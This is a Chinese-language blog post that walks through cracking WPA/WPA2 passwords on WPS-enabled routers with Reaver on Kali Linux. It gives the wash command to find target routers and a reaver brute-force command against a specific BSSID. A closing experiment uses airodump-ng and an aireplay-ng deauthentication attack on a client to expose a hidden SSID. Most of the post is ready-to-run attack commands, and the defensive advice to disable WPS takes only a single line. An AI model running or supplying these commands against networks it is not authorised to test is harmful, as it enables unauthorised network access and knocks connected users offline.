---
layout: post
title: 使用Reaver破解开启了WPS功能的wifi密码(wpa/wpa2)
---

来自wikipeida：

> Wi-Fi保护设置（简称WPS，全称Wi-Fi Protected Setup）是一个无线网络安全标准，旨在让家庭用户使用无线网络时简化加密步骤。此标准由Wi-Fi联盟（Wi-Fi Alliance）于2006年制定。
>
> 在2011年12月28日安全专家Stefan Viehbock报出此标准的一个重大安全漏洞，此漏洞允许远程攻击者使用暴力攻击在几小时内就能获取WPS的PIN码和WPA/WPA2的PSK码。一些新出产的无线路默认启动WPS功能，所以现在建议用户关闭无线路由器上的WPS一键加密功能，虽然有些无线器上无法关闭此功能。

WPS的目的是简化用户输入密码的步骤；在某个设备连接wifi，需要输入密码时，只要按一下无线路由器上的wps按钮就可以了。

Reaver是除字典破解之外的另一个选择：

* [Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)](http://topspeedsnail.com/kali-linux-crack-wifi-wpa/)

如果无线路由器开启了WPS，就不必使用上面的破解方法了。

WPS的pin码并没有加密。Reaver会暴力破解pin码，找到pin码也就找到了密码。一般用时也不短。

注意：

* 网卡支持数据包注入，一般笔记本不支持
* 要求无线信号强
* 如果发送pin码过快，有可能造成路由器崩溃；就类似对服务器的DDOS攻击。
* Reaver有很多选项，我只使用最基本的选项，你也许需要根据情况使用其他选项。查看帮助：reaver ?

执行[Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)](http://topspeedsnail.com/kali-linux-crack-wifi-wpa/)中的前三步，打开无线网卡的的监控模式。

### 3）找到开启WPS功能的无线路由器

我们不用逐一测试，而是使用wash命令。

{% highlight shell %}
# wash -i wlan0mon -C
{% endhighlight %}

如果什么也没有表示周围没有开启WPS的无线路由器。记住要破解wifi的BSSID。

### 4）开始破解密码

{% highlight shell %}
# reaver -i wlan0mon -b C8:3A:35:30:3E:C8 -vv -a
{% endhighlight %}

等待2-10小时：

最后，不要忘了结束无线网卡的监控模式：

{% highlight shell %}
# airmon-ng stop wlan0mon
{% endhighlight %}

***

总结：wps这个功能不用就把它关闭了吧。

***

一个小实验：

我看到有人说隐藏SSID可以让wifi更不容易被破解，我就来测试一下。

> 隐藏SSID就是把你老大的AP隐藏起来，不让别人搜索到。请注意，这样的话，在连接wifi时就要手动输入AP名。

![破解wifi密码]({{ site.baseurl }}/images/2016/4/Screenshot from 2016-04-22 15-45-17.png)

只看到了 length 12，没有ap名。

查看方法：

{% highlight shell %}
# airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 wlan0mon
{% endhighlight %}

{% highlight shell %}
# aireplay-ng -0 30 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon
{% endhighlight %}

破解密码的方法不变；使用上面两个命令就可以轻松得到ap名。

事实证明，隐藏SSID并不管啥事；其实设置一个复杂的密码比隐藏SSID要管用的多。